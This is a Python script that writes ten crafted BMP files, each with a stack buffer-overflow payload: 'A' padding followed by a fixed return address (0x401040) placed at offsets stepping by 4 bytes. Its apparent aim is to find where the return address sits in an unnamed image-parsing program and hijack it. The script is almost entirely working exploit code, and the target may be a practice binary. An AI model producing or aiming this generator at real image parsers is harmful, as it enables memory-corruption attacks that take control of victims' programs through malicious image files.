import struct

def create_exploit_files():
    width = 128
    height = 128
    bpp = 24
    pixel_data_size = width * height * (bpp // 8)
    file_size = 54 + pixel_data_size

    # BMP Header
    bmp_header = bytearray([
        0x42, 0x4D
    ])
    bmp_header += struct.pack('<I', file_size)  # File size
    bmp_header += b'\x00\x00\x00\x00'           # Reserved
    bmp_header += struct.pack('<I', 54)         # Pixel data offset
    bmp_header += struct.pack('<I', 40)         # DIB header size
    bmp_header += struct.pack('<I', width)      # Width
    bmp_header += struct.pack('<I', height)     # Height
    bmp_header += struct.pack('<H', 1)          # Planes
    bmp_header += struct.pack('<H', bpp)        # Bits per pixel
    bmp_header += b'\x00\x00\x00\x00'           # Compression
    bmp_header += struct.pack('<I', pixel_data_size)  # Image size
    bmp_header += b'\x00\x00\x00\x00' * 4       # Other fields

    # Generate 10 files with different return address offsets
    for i in range(10):
        offset_adjustment = i * 4  # Adjust return address position by 4 bytes each time
        payload = (
            b'A' * (0x140 + offset_adjustment) + 
            struct.pack('<I', 0x401040) + 
            b'A' * (pixel_data_size - (0x140 + offset_adjustment) - 4)
        )

        file_name = f'exploit_offset_{i}.bmp'
        with open(file_name, 'wb') as f:
            f.write(bmp_header)
            f.write(payload)

    print("10 BMP files with varying return address offsets have been created.")

create_exploit_files()
